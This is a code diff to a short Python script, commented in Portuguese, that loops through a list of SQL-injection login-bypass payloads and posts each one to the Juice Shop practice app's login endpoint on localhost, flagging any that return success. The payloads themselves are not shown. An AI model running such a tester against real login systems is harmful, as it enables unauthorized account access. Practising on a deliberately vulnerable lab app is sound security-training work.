@@ -1,6 +1,4 @@
-
 import requests
-from bs4 import BeautifulSoup
 
 # Lista de payloads para tentar burlar a injeção SQL em campos de login
 bypass_sql_injection_list = [
@@ -33,19 +31,19 @@ def json_login_build(email, password):
     """Cria o payload JSON para o login."""
     return {
         "email": email,
-        "password": password
+        "senha": password
     }
 
 def sql_injection_test(payloads, url):
     """Testa cada payload na lista de injeção SQL."""
     for payload in payloads:
-        json_login = json_login_build(payload, "password")
+        json_login = json_login_build(payload, "password123")
         response = login_test(url, json_login)
         if response.status_code == 200:
-            print(f"Payload '{payload}' may have bypassed authentication!")
+            print(f"Payload -> {payload} <- may have bypassed authentication!")
         else:
-            print(f"Payload '{payload}' did not bypass authentication.")
+            print(f"Payload -> {payload} <- did not bypass authentication.")
+
 
 # Exemplo de uso no JuiceShop
-
-sql_injection_test(bypass_sql_injection_list, "http://localhost:3000/#/login")
+sql_injection_test(bypass_sql_injection_list, "http://localhost:3000/rest/user/login")
